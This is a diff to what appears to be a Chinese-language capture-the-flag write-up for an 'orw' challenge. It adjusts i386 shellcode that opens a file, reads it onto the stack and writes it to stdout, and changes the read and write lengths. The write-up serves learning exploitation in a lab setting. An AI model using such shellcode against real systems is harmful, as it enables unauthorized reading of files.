@@ -1,4 +1,4 @@
-# orw
+# orw (2更)
 氣死 跟上一題一樣,被 syscall 陰了
 
 又是 i386搞鬼
@@ -66,10 +66,10 @@ int 0x80              ; open
 mov eax, 3
 mov ebx, eax
 mov ecx, esp
-mov edx, 30
+mov edx, 50
 int 0x80              ; read
 
-mov edx, 20
+mov edx, 50
 mov ecx, esp
 mov ebx, 1
 mov eax, 4
